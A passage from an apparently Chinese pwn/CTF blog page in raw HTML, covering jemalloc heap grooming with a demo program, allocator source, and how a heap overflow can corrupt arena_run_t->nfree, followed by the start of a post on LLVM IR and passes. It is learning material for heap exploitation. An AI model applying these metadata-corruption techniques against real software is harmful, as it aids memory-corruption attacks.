class="string">&quot;step 2: creating holes in between the victim objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(foo[<span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">free</span>(foo[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">free</span>(foo[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">free</span>(foo[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">free</span>(foo[<span class="number">9</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, <span class="number">8</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, <span class="number">5</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, <span class="number">7</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, <span class="number">6</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, <span class="number">9</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;step 3: fill holes with vulnerable objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NALLOC/<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        bar[i] = <span class="built_in">malloc</span>(TSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar[%d]:\t\t%p\n&quot;</span>, i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)bar[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./jemalloc                                                           </span><br><span class="line">step <span class="number">1</span>: controlled allocations of victim objects</span><br><span class="line">foo[<span class="number">0</span>]:		<span class="number">0x175f9000</span></span><br><span class="line">foo[<span class="number">1</span>]:		<span class="number">0x175f9010</span></span><br><span class="line">foo[<span class="number">2</span>]:		<span class="number">0x175f9020</span></span><br><span class="line">foo[<span class="number">3</span>]:		<span class="number">0x175f9030</span></span><br><span class="line">foo[<span class="number">4</span>]:		<span class="number">0x175f9040</span></span><br><span class="line">foo[<span class="number">5</span>]:		<span class="number">0x175f9050</span></span><br><span class="line">foo[<span class="number">6</span>]:		<span class="number">0x175f9060</span></span><br><span class="line">foo[<span class="number">7</span>]:		<span class="number">0x175f9070</span></span><br><span class="line">foo[<span class="number">8</span>]:		<span class="number">0x175f9080</span></span><br><span class="line">foo[<span class="number">9</span>]:		<span class="number">0x175f9090</span></span><br><span class="line">step <span class="number">2</span>: creating holes in between the victim objects</span><br><span class="line">foo[<span class="number">8</span>]:		<span class="number">0x175f9080</span></span><br><span class="line">foo[<span class="number">5</span>]:		<span class="number">0x175f9050</span></span><br><span class="line">foo[<span class="number">7</span>]:		<span class="number">0x175f9070</span></span><br><span class="line">foo[<span class="number">6</span>]:		<span class="number">0x175f9060</span></span><br><span class="line">foo[<span class="number">9</span>]:		<span class="number">0x175f9090</span></span><br><span class="line">step <span class="number">3</span>: fill holes with vulnerable objects</span><br><span class="line">bar[<span class="number">0</span>]:		<span class="number">0x175f9090</span></span><br><span class="line">bar[<span class="number">1</span>]:		<span class="number">0x175f9060</span></span><br><span class="line">bar[<span class="number">2</span>]:		<span class="number">0x175f9070</span></span><br><span class="line">bar[<span class="number">3</span>]:		<span class="number">0x175f9050</span></span><br><span class="line">bar[<span class="number">4</span>]:		<span class="number">0x175f9080</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我故意打乱了释放的顺序，但是 jemalloc-5.0.1 还是可以“记住”我的释放顺序</li>
<li>也就是说，jemalloc-5.0.1 中一定有一个结构来我的释放顺序，极有可能是链表（我在源码中没有找到）</li>
<li>从结果上分析，jemalloc-5.0.1 采用了 LIFO</li>
</ul>
<h2 id="Metadata-corruption（元数据损坏）"><a href="#Metadata-corruption（元数据损坏）" class="headerlink" title="Metadata corruption（元数据损坏）"></a>Metadata corruption（元数据损坏）</h2><p>由于 jemalloc 不是基于 freelists（它使用基于宏的红黑树代替），因此无法使用 unlink 和 frontlink 漏洞利用技术，相反，我们将关注如何强制 “malloc()” 返回一个指向已初始化堆区域的指针</p>
<p><strong>Run (arena_run_t)</strong></p>
<p>run 只是一些相同 size 的 regions 的集合，run 的元数据遵循 arena_run_t 的结构，每个<br>run 包含一个指向它所在区域的 bin 的指针</p>
<p>在解除分配时，区域大小是未知的，因此无法直接计算 bin 索引，相反，jemalloc 将首先找到要释放的内存所在的 run，然后取消引用存储在 run 的 header 中的 bin 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* jemalloc-2.2.5/src/arena.c */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">arena_dalloc_bin_run</span><span class="params">(<span class="keyword">arena_t</span> *arena, <span class="keyword">arena_chunk_t</span> *chunk, <span class="keyword">arena_run_t</span> *run,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">arena_bin_t</span> *bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> binind;</span><br><span class="line">	<span class="keyword">arena_bin_info_t</span> *bin_info;</span><br><span class="line">	<span class="keyword">size_t</span> npages, run_ind, past;</span><br><span class="line"></span><br><span class="line">	assert(run != bin-&gt;runcur);</span><br><span class="line">	assert(arena_run_tree_search(&amp;bin-&gt;runs, &amp;chunk-&gt;<span class="built_in">map</span>[</span><br><span class="line">	    (((<span class="keyword">uintptr_t</span>)run-(<span class="keyword">uintptr_t</span>)chunk)&gt;&gt;PAGE_SHIFT)-map_bias]) == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	binind = arena_bin_index(chunk-&gt;arena, run-&gt;bin);</span><br><span class="line">	bin_info = &amp;arena_bin_info[binind];</span><br><span class="line"></span><br><span class="line">	malloc_mutex_unlock(&amp;bin-&gt;lock);</span><br><span class="line">	<span class="comment">/******************************/</span></span><br><span class="line">	npages = bin_info-&gt;run_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line">	run_ind = (<span class="keyword">size_t</span>)(((<span class="keyword">uintptr_t</span>)run - (<span class="keyword">uintptr_t</span>)chunk) &gt;&gt; PAGE_SHIFT);</span><br><span class="line">	past = (<span class="keyword">size_t</span>)(PAGE_CEILING((<span class="keyword">uintptr_t</span>)run +</span><br><span class="line">	    (<span class="keyword">uintptr_t</span>)bin_info-&gt;reg0_offset + (<span class="keyword">uintptr_t</span>)(run-&gt;nextind *</span><br><span class="line">	    bin_info-&gt;reg_size) - (<span class="keyword">uintptr_t</span>)chunk) &gt;&gt; PAGE_SHIFT);</span><br><span class="line">	malloc_mutex_lock(&amp;arena-&gt;lock);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果run最初是干净的,并且某些页面未被使用,则释放run的脏部分之前,修剪干净的页面 */</span></span><br><span class="line">	<span class="keyword">if</span> ((chunk-&gt;<span class="built_in">map</span>[run_ind-map_bias].bits &amp; CHUNK_MAP_DIRTY) == <span class="number">0</span> &amp;&amp; past</span><br><span class="line">	    - run_ind &lt; npages) &#123;</span><br><span class="line">        <span class="comment">/* 修剪干净的页面,事先转换为large run,首先设置最后一个map元素,以防这是one-page run */</span></span><br><span class="line">		chunk-&gt;<span class="built_in">map</span>[run_ind+npages<span class="number">-1</span>-map_bias].bits = CHUNK_MAP_LARGE |</span><br><span class="line">		    (chunk-&gt;<span class="built_in">map</span>[run_ind+npages<span class="number">-1</span>-map_bias].bits &amp;</span><br><span class="line">		    CHUNK_MAP_FLAGS_MASK);</span><br><span class="line">		chunk-&gt;<span class="built_in">map</span>[run_ind-map_bias].bits = bin_info-&gt;run_size |</span><br><span class="line">		    CHUNK_MAP_LARGE | (chunk-&gt;<span class="built_in">map</span>[run_ind-map_bias].bits &amp;</span><br><span class="line">		    CHUNK_MAP_FLAGS_MASK);</span><br><span class="line">		arena_run_trim_tail(arena, chunk, run, (npages &lt;&lt; PAGE_SHIFT),</span><br><span class="line">		    ((past - run_ind) &lt;&lt; PAGE_SHIFT), <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">/* npages = past - run_ind; */</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_DEBUG</span></span><br><span class="line">	run-&gt;magic = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	arena_run_dalloc(arena, run, <span class="literal">true</span>);</span><br><span class="line">	malloc_mutex_unlock(&amp;arena-&gt;lock);</span><br><span class="line">	<span class="comment">/****************************/</span></span><br><span class="line">	malloc_mutex_lock(&amp;bin-&gt;lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_STATS</span></span><br><span class="line">	bin-&gt;stats.curruns--;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc 的分配相当依赖 arena_run_t 结构体，而 jemalloc-2.2.5 分配 region 前，会在目标 run 的范围的头部申请一个 arena_run_t 结构体来管理 run（jemalloc-5.0.1 不会分配）</li>
<li>如果有堆溢出，就可以劫持 arena_run_t 结构体</li>
<li>主要是劫持 arena_run_t-&gt;nfree：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">arena_run_t</span>)*<span class="number">0x7fc184808000</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  magic = <span class="number">944430995</span>,</span><br><span class="line">  bin = <span class="number">0x7fc185000d70</span>,</span><br><span class="line">  nextind = <span class="number">1</span>,</span><br><span class="line">  nfree = <span class="number">49</span> <span class="comment">/* target */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 nfree 为初始值，jemalloc.2.2.5 就会认为该 run 没有进行分配，然后无视之前已经在 run 中分配的部分，从头开始申请</li>
<li>这样就可以覆盖一些关键数据</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/30/LLVM%20pass%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/30/LLVM%20pass%20pwn/" class="post-title-link" itemprop="url">LLVM pass pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-30 21:49:07" itemprop="dateCreated datePublished" datetime="2022-05-30T21:49:07+08:00">2022-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 23:11:42" itemprop="dateModified" datetime="2022-06-04T23:11:42+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>LLVM 项目是模块化、可重用的编译器以及工具链技术的集合，用于优化以任意程序语言编写的程序的编译时间 (compile-time)，链接时间 (link-time)，运行时间 (run-time)，以及空闲时间 (idle-time) </p>
<p>LLVM 官方文档：<a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p>
<p>LLVM 的安装：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chikey/article/details/85004556">一份关于各种安装LLVM的方法的总结</a> </p>
<p>报错 llvm-config 无法找到：sudo apt install llvm</p>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653907281879-1654355265749.png" class width="1653907281879"> 
<p>报错 Failed building wheel for llvmlite：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41977618/article/details/119572879">Python安装llvmlite、numba报错解决方案</a> </p>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653907435235-1654355265749.png" class width="1653907435235"> 
<h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p>在开发编译器时，通常的做法是将源代码编译到某种中间表示（Intermediate Representation，一般称为 IR），然后再将 IR 翻译为目标体系结构的汇编（比如 MIPS 或 X86） </p>
<p>传给 LLVM PASS 进行优化的数据是 LLVM IR，即代码的中间表示，LLVM IR有三种表示形式 ：这三种中间格式是完全等价的：</p>
<ul>
<li>在内存中的编译中间语言（我们无法通过文件的形式得到）</li>
<li>在硬盘上存储的二进制中间语言（格式为 <code>.bc</code>）</li>
<li>人类可读的代码语言（格式为 <code>.ll</code>）</li>
</ul>
<p>从对应格式转化到另一格式的命令如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">   read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  clang -emit-llvm -S main.c -o main.ll</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot; // 数据布局</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [5 x i8] c&quot;bye\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #0 &#123;</span><br><span class="line">  %1 = alloca [16 x i8], align 16 /* char name[0x10]; */</span><br><span class="line">  %2 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0</span><br><span class="line">  %3 = call i64 @read(i32 0, i8* %2, i64 16)</span><br><span class="line">  %4 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0</span><br><span class="line">  %5 = call i64 @write(i32 1, i8* %4, i64 16)</span><br><span class="line">  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i64 @read(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare dso_local i64 @write(i32, i8*, i64) #1</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 10.0.0-4ubuntu1 &quot;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>@代表全局标识符（函数，全局变量）</li>
<li>%代表局部标识符（寄存器名称也就是局部变量，类型）</li>
<li>alloca指令：用于分配内存堆栈给当前执行的函数，当这个函数返回其调用者时自动释放</li>
</ul>
<h2 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h2><p>LLVM 的 pass 框架是 LLVM 系统的一个很重要的部分，LLVM 的优化和转换工作就是由多个 pass 来一起完成的，类似流水线操作一样，每个 pass 完成特定的优化工作，要想真正发挥 LLVM 的威力，掌握 pass 是不可或缺的一环</p>
<p>总的来说，所有的 pass 大致可以分为两类：</p>
<ul>
<li>分析 (<code>analysis</code>) 和转换分析类的 pass 以提供信息为主</li>
<li>转换类 (<code>transform</code>) 的 pass 优化中间代码</li>
</ul>
<p>样例文件在 <code>llvm-project/llvm/lib/Transforms/Hello/Hello.cpp</code> 中，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            errs() &lt;&lt; <span class="string">&quot;opcode=&quot;</span> &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; <span class="string">&quot; NumOperands=&quot;</span> &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>输入一下指令，可以得到编译好的 LLVMHello.so：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  Hello clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<p>用 LLVMHello.so 来测试 main.ll：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Hello opt -load ./LLVMHello.so -hello ./main.ll</span><br><span class="line">WARNING: Yo<span class="string">u&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">opcode=alloca NumOperands=<span class="number">1</span></span><br><span class="line">opcode=getelementptr NumOperands=<span class="number">3</span></span><br><span class="line">opcode=call NumOperands=<span 